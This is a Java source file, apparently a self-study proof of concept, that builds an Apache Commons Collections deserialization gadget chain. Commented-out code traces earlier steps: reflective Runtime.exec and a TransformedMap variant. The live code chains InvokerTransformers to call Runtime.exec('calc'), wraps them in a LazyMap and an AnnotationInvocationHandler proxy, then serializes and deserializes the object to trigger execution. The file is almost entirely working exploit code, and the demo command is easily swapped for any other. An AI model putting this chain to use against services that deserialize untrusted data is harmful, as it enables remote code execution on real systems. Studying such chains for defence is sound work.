import javafx.beans.binding.ObjectExpression;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;


import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC6Test {
    public static void main(String[] args) throws Exception {
//    Runtime.getRuntime().exec("calc");
//        Runtime r = Runtime.getRuntime();
        //反射调用exec方法
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r, "calc");

//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
//        InvokerTransformer invokerTransformer =  new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"});
//        HashMap<Object ,Object> map = new HashMap<>();
//        map.put("key","aaa");
//        Map<Object,Object> transfromedMap =TransformedMap.decorate(map,null,invokerTransformer);
//        for(Map.Entry entry:transfromedMap.entrySet()){
//            entry.setValue(r);
//        }
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor annotationInvocationHandlerConstrutor = c.getDeclaredConstructor(Class.class,Map.class);
//        annotationInvocationHandlerConstrutor.setAccessible(true);
//        Object o = annotationInvocationHandlerConstrutor.newInstance(Override.class,transfromedMap);
//        serialize(o);
//        unserialize("ser.bin");

//        Class c = Runtime.class;
//        Method getRuntimeMethod = c.getMethod("getRuntime",null);
//        Runtime r = (Runtime) getRuntimeMethod.invoke(null,null);
//        Method execMethod = c.getMethod("exec",String.class);
//        execMethod.invoke(r,"calc");

//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}).transform(Runtime.class);
//        Runtime r = (Runtime)new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
//
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
//                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
//                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
//
//        };
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        //chainedTransformer.transform(Runtime.class);
//
//        HashMap<Object ,Object> map = new HashMap<>();
//        map.put("value","aaa");
//        Map<Object,Object> transfromedMap =TransformedMap.decorate(map,null,chainedTransformer);
//
//        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor annotationInvocationHandlerConstrutor = c.getDeclaredConstructor(Class.class,Map.class);
//        annotationInvocationHandlerConstrutor.setAccessible(true);
//        Object o = annotationInvocationHandlerConstrutor.newInstance(Target.class,transfromedMap);
//        serialize(o);
//        unserialize("ser.bin");
//        //ConstantTransformer
//
//
//
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object ,Object> map = new HashMap<>();
        Map<Object,Object> lazyMap = LazyMap.decorate(map,chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHandlerConstrutor = c.getDeclaredConstructor(Class.class,Map.class);
        annotationInvocationHandlerConstrutor.setAccessible(true);
        InvocationHandler h = (InvocationHandler) annotationInvocationHandlerConstrutor.newInstance(Override.class,lazyMap);
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h);
        Object o =  annotationInvocationHandlerConstrutor.newInstance(Override.class,mapProxy);
        serialize(o);
        unserialize("ser.bin");

    }
    public  static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
        /*
        写对象，序列化
         */
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        /*
        读对象，反序列化
         */
        return obj;
    }
}
